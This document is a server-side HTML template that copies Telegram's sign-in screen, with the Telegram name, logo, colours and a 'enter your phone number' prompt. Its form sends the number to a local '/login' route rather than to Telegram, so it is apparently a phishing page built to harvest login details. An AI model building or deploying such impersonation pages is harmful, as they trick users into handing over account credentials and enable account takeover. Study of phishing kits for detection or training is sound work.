<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 60px 20px;
        }
        .logo {
            width: 160px;
            height: 160px;
            margin-bottom: 40px;
        }
        h1 {
            font-size: 32px;
            font-weight: 400;
            color: #000;
            margin-bottom: 12px;
        }
        .subtitle {
            color: #707579;
            font-size: 16px;
            margin-bottom: 40px;
            text-align: center;
        }
        .input-wrapper {
            width: 100%;
            max-width: 360px;
            margin-bottom: 12px;
        }
        .input-field {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            outline: none;
            transition: border-color 0.2s;
        }
        .input-field:focus {
            border-color: #3390ec;
        }
        .error {
            color: #e53935;
            font-size: 14px;
            margin-bottom: 12px;
            text-align: center;
        }
        .btn {
            width: 100%;
            max-width: 360px;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            color: #fff;
            background: #3390ec;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover {
            background: #2b7cd3;
        }
        .terms {
            margin-top: 24px;
            font-size: 14px;
            color: #707579;
            text-align: center;
        }
        .terms a {
            color: #3390ec;
            text-decoration: none;
        }
        .country-select {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 16px;
            width: 100%;
            max-width: 360px;
        }
    </style>
</head>
<body>
    <svg class="logo" viewBox="0 0 160 160">
        <circle cx="80" cy="80" r="80" fill="#3390ec"/>
        <path fill="#fff" d="M67.5 120c-2.7 0-2.2-1-3.1-3.5l-7.8-25.7 60-36.6"/>
        <path fill="#c8daea" d="M67.5 120c2 0 2.9-.9 4-2l10.7-10.4-13.3-8"/>
        <path fill="#fff" d="M68.9 99.6l32.3 23.9c3.7 2 6.3 1 7.2-3.4l13.1-61.9c1.3-5.4-2-7.8-5.6-6.2l-77.1 29.7c-5.3 2.1-5.2 5-1 6.3l19.8 6.2 45.8-28.9c2.2-1.3 4.2-.6 2.5.8"/>
    </svg>
    
    <h1>Telegram</h1>
    <p class="subtitle">Please confirm your country code<br>and enter your phone number.</p>
    
    {% if error %}
    <p class="error">{{ error }}</p>
    {% endif %}
    
    <form action="/login" method="POST">
        <div class="input-wrapper">
            <input type="tel" name="phone" class="input-field" placeholder="+1 234 567 8900" required autofocus>
        </div>
        <button type="submit" class="btn">Next</button>
    </form>
    
    <p class="terms">
        By signing up, you agree to the <a href="#">Terms of Service</a>.
    </p>
</body>
</html>
